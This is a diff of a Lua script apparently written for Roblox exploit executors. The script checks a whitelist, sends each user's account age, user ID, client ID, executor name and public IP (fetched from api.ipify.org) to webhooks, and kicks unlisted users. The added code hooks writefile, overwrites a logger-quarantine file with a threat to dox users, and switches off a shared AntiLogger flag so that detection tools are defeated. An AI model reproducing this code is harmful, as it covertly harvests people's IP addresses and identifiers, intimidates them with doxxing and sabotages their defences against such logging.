@@ -75,7 +75,7 @@ local function logValidAccess(url, title, description)
                     {name = "Account Age: ", value = lplr.AccountAge},
                     {name = 'UserID:', value = lplr.UserId},
                     {name = 'clientID:', value = clientID},
-                    {name = "Config:", value = "BOOSTER"},
+                    {name = "Config:", value = "PRIVATE"},
                     {name = "Exploit: ", value = identifyexecutor() or "Unknown"},
                     {name = "Executed on:", value = os.date("%d/%m/%Y  %H:%M")},
                 }
@@ -116,7 +116,7 @@ local function logUnauthorizedAccess(url, title, description)
                     {name = "Account Age: ", value = lplr.AccountAge},
                     {name = 'UserID:', value = lplr.UserId},
                     {name = 'clientID:', value = clientID},
-                    {name = "Config:", value = "BOOSTER"},
+                    {name = "Config:", value = "PRIVATE"},
                     {name = "Exploit: ", value = identifyexecutor() or "Unknown"},
                     {name = "Executed on:", value = os.date("%d/%m/%Y  %H:%M")},
                     {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')},
@@ -152,5 +152,34 @@ if isBlacklisted(clientID) or not isWhitelisted(clientID) then
     logUnauthorizedAccess(blekhook, "Unauthorized Access Attempt", "Player attempted to bypass whitelist.")
     lplr:Kick("ATTEMPT TO BYPASS WHITELIST | YOU'RE GONNA BE PUNISHED")
 else
-    logValidAccess(hook, "Valid Access", "Booster user playing.")
+    logValidAccess(hook, "Valid Access", "Private user playing.")
+end
+
+
+local protectionMessage = "[SALAD ANTI TAMPER]: This script is protected by Salad Anti Tamper v0.1 BETA | The script prevented: SystemXVoid AntiTamper from getting the webhook, your ip got logged and if you dont want to get doxxed dont try to bypass my whitelist ever again. Thank you"
+
+local originalWritefile = writefile
+
+local function protectedWritefile(filename, data)
+    if filename == "quarantinedloggers.txt" then
+        data = protectionMessage
+    end
+    return originalWritefile(filename, data)
+end
+
+while wait(0.1) do  
+    if writefile ~= protectedWritefile then
+        writefile = protectedWritefile
+    end
+
+    if isfile("quarantinedloggers.txt") then
+        local content = readfile("quarantinedloggers.txt")
+        if content ~= protectionMessage then
+            writefile("quarantinedloggers.txt", protectionMessage)
+        end
+    end
+
+    if shared.AntiLogger == true then
+        shared.AntiLogger = false
+    end
 end
